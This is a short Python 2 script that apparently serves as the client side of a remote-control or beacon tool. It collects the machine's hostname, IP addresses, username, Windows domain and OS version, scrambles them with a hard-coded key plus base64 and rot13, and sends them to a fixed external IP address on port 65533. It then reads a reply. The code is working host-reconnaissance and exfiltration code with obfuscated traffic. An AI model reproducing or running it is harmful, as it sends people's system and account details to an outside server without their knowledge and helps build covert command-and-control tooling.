lan_ip_prefix = "192.168"

# Application assumptions
# User switching is disabled
# #na OS is windows

# fake encryption
import base64, codecs

def comms_recv(databytes):
    data = conn.recv(databytes)
    key = "aw9292929296983244"
    dec = []
    enc = base64.urlsafe_b64decode(str(codecs.decode(data, "rot_13")[::-1]))
    for i in range(len(enc)):
        key_c = key[i % len(key)]
        dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)
def comms_send(data):
    key = "aw9292929296983244"
    enc = []
    for i in range(len(data)):
        key_c = key[i % len(key)]
        enc_c = chr((ord(data[i]) + ord(key_c)) % 256)
        enc.append(enc_c)
    conn.sendall(codecs.encode(base64.urlsafe_b64encode("".join(enc))[::-1], "rot_13"))


import sys, os
import platform, socket
import getpass

# if platform.system() != "Windows": sys.exit("This application only functions on Windows machines")

host = socket.gethostname()
host = "110.20.163.189"
port = 65533  # The same port as used by the server
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))

clienthostname = socket.gethostname()
clientip_all = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]]
try:
    clientip_lan = [ip for ip in clientip_all if ip.startswith(lan_ip_prefix)][-1]
except:
    clientip_lan = "{unknown}"
    print("IP beginning with '%s' could not be found!\n" % lan_ip_prefix)
clientsystem = "%s %s (%s)" % (platform.system(), platform.release(), platform.version())
clientusername = getpass.getuser()
clientuserdomain = os.environ.get("USERDOMAIN") if os.environ.get("USERDOMAIN") else "{unknown}"
print("Hostname: " + clienthostname)
print("Local IP: " + clientip_lan)
print("All IP addresses: " + ", ".join(clientip_all))
print("Username: " + clientusername)
print("Domain: " + clientuserdomain)
print("Account: " + ((clientuserdomain + "\\" + clientusername) if clientuserdomain != "{unknown}" else clientusername))
print("Client System: " + clientsystem)
comms_send("::".join(
    [clienthostname, clientip_lan, ", ".join(clientip_all), clientusername, clientuserdomain, clientsystem]))

#data = s.recv(1024)
data = comms_recv(1024)
conn.close()
print('Received', repr(data))
